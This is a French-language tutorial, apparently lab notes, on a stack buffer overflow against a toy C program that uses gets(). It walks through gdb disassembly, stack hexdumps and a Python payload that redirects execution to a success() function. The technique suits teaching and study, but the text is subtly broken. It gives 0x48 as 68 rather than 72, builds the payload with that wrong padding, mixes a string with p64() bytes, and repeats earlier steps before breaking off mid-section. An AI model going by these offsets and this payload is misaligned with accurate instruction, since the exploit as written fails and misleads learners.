# Bufffer Overflow

Pour illustrer, prenons un exemple simple et essayons d'exécuter success

```c
void success() {
    printf("Bravo ! Vous avez réussi à exécuter success() !\n");
}

int main() {
    char buffer[64];

    printf("Votre nom: ");
    gets(buffer);
    return 0;
}
```

Regardons si un dépassement de buffer déclenche une segfault (probalement, spoiler oui)

```sh
└─$ ./ret2success
Votre nom: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

Ouvrons gdb et regardons

```sh
gef➤  disas success 
Dump of assembler code for function success:
   0x0000000000401146 <+0>:	push   rbp
   0x0000000000401147 <+1>:	mov    rbp,rsp
   0x000000000040114a <+4>:	lea    rax,[rip+0xeb7]        # 0x402008
   0x0000000000401151 <+11>:	mov    rdi,rax
   0x0000000000401154 <+14>:	call   0x401030 <puts@plt>
   0x0000000000401159 <+19>:	nop
   0x000000000040115a <+20>:	pop    rbp
   0x000000000040115b <+21>:	ret
End of assembler dump.
gef➤  disas main 
Dump of assembler code for function main:
   0x000000000040115c <+0>:	push   rbp
   0x000000000040115d <+1>:	mov    rbp,rsp
   0x0000000000401160 <+4>:	sub    rsp,0x40
   0x0000000000401164 <+8>:	lea    rax,[rip+0xed0]        # 0x40203b
   0x000000000040116b <+15>:	mov    rdi,rax
   0x000000000040116e <+18>:	mov    eax,0x0
   0x0000000000401173 <+23>:	call   0x401040 <printf@plt>
   0x0000000000401178 <+28>:	lea    rax,[rbp-0x40]
   0x000000000040117c <+32>:	mov    rdi,rax
   0x000000000040117f <+35>:	call   0x401050 <gets@plt>
   0x0000000000401184 <+40>:	mov    eax,0x0
   0x0000000000401189 <+45>:	leave
   0x000000000040118a <+46>:	ret
End of assembler dump.
gef➤  b *main+40
Breakpoint 1 at 0x401184
```

L'adresse de success est donc `0x401146`.
Nous voulons poser notre break apres le `gets()` pour pouvoir observer le contenu de la stack apres injection du payload.

```sh
gef➤  run
Starting program: /[...]/ret2success 
#...
Votre nom: toto_lala

gef➤  hexdump byte $sp -s 128
0x00007fffffffdb80     74 6f 74 6f 5f 6c 61 6c 61 00 00 00 00 00 00 00    toto_lala.......
0x00007fffffffdb90     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffdba0     00 00 00 00 00 00 00 00 30 50 fe f7 ff 7f 00 00    ........0P......
0x00007fffffffdbb0     00 00 00 00 00 00 00 00 50 dc ff ff ff 7f 00 00    ........P.......
0x00007fffffffdbc0     01 00 00 00 00 00 00 00 68 ad dd f7 ff 7f 00 00    ........h.......
0x00007fffffffdbd0     c0 dc ff ff ff 7f 00 00 5c 11 40 00 00 00 00 00    ........\.@.....
0x00007fffffffdbe0     40 00 40 00 01 00 00 00 d8 dc ff ff ff 7f 00 00    @.@.............
0x00007fffffffdbf0     d8 dc ff ff ff 7f 00 00 a1 83 41 58 96 78 13 af    ..........AX.x..
```

Notre buffer commence en `0x..db80`

Maintenant plusieurs techniques possibles, la plus simple est de noter l'adresse à laquelle se trouve notre buffer, puis mettre un second break sur le `ret` qui declenche le segfault (ici celui en `main+46`), et regarder la nouvelle valeur de `$rsp`, la différence des 2 sera le padding à mettre dans notre payload avant d'y inscrire l'adresse de la cible. Ici par exemple ce que nous voulons:

```sh
gef➤  b *main+46
Breakpoint 2 at 0x40118a
gef➤  continue
```

L'adresse `$rsp` est maintenant `0x00007fffffffdbc8`. Donc nous avons `0x..dbc8 - 0x..db80` soit `0x48` (68) de padding.

```sh
gef➤  hexdump byte $sp -s 128
0x00007fffffffdb80     XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    toto_lala.......
0x00007fffffffdb90     XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    ................
0x00007fffffffdba0     XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    ........0P......
0x00007fffffffdbb0     XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    ........P.......
0x00007fffffffdbc0     XX XX XX XX XX XX XX XX < - C  I  B  L  E   - >    ........h.......
0x00007fffffffdbd0     c0 dc ff ff ff 7f 00 00 5c 11 40 00 00 00 00 00    ........\.@.....
0x00007fffffffdbe0     40 00 40 00 01 00 00 00 d8 dc ff ff ff 7f 00 00    @.@.............
0x00007fffffffdbf0     d8 dc ff ff ff 7f 00 00 a1 83 41 58 96 78 13 af    ..........AX.x..
```

Notre payload sera donc

```py
adr_success = 0x401146
payload = 'X'*68 + p64(adr_success)
```

---


## Comment repérer ?

```sh
└─$ ./ret2success
Votre nom: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

Ce qui signifie qu'un adresse de retour à été écrasée, ici l'adresse de retour de main.
Essayons de l'utiliser à notre avantage.

## Objectif

Ce que nous voulons est réecrire cette adresse avec adresse maitrisée (celle du buffer dans le cas d'un ret2shellcode, celle d'une fonction dans le cas d'un ret2func).

Breakons dans gdb juste apres le `gets()` pour voir à quoi correspond la stack

